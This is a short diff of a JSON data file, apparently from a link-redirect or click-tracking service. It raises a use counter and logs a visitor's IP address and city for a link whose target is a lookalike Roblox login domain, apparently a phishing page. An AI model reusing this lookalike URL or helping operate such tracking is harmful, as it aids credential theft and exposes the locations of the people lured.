@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1124,
+    "useCount": 1125,
     "createdBy": "admin",
     "clicks": [
       {
@@ -9136,6 +9136,14 @@
         "city": "Mexicali",
         "flag": "🇲🇽",
         "countryCode": "MX"
+      },
+      {
+        "timestamp": 1777273052289,
+        "ip": "66.41.132.241",
+        "country": "United States",
+        "city": "Saint Paul",
+        "flag": "🇺🇸",
+        "countryCode": "US"
       }
     ]
   },
